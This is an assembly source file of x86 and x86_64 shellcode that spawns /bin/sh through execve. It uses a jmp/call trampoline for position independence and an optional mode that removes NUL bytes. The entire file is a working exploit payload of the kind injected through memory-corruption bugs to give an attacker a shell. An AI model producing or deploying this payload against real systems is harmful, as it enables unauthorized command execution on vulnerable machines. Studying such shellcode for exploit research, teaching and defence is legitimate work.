/*
 * x86{,_64} shell code to execve() /bin/sh.  No exit() and has all NUL bytes
 * removed if MASK_NULS is define.  Position independent.
 *
 * Licensed under GPLv2.
 */
.section ".data"

#ifdef MASK_NULS
.macro	term	reg
	subb	$1, 7(\reg)
.endm
#else /* MASK_NULS */
.macro	term	reg
.endm
#endif /* MASK_NULS */

/*
 * Entry point.
 */
.globl _start
_start:
	jmp	tramp

#ifndef __x86_64
.macro	do_execve
	xorl	%eax, %eax
	addl	$0xb, %eax		# movl $0xb, %eax
	movl	0(%esp), %ebx
	xorl	%ecx, %ecx		# Linux allows a NULL argv.  It's not
					# portable though!
	term	%ebx
	xorl	%edx, %edx		# movl $0x0, %edx
	int	$0x80
.endm
#else /* __x86_64 */
.macro	do_execve
	xor	%rax, %rax
	add	$59, %rax		# movl $59, %rax
	mov	0(%rsp), %rdi
	xor	%rsi, %rsi		# Linux allows a NULL argv.  It's not
					# portable though!
	term	%rdi
	xor	%rdx, %rdx		# movl $0x0, %r10
	syscall
.endm
#endif /* __x86_64 */

start:	do_execve
tramp:	call	start
/*
 * The string immediately follows tramp so that when we call start, the
 * address of the string will be at the top of the stack.
 */
#ifdef MASK_NULS
cmd:	.ascii "/bin/sh\x01"		# terminated with a 0x1 which we
					# decrement when we execve, this means
					# no embedded nul bytes.
#else /* MASK_NULS */
cmd:	.string "/bin/sh"
#endif /* MASK_NULS */
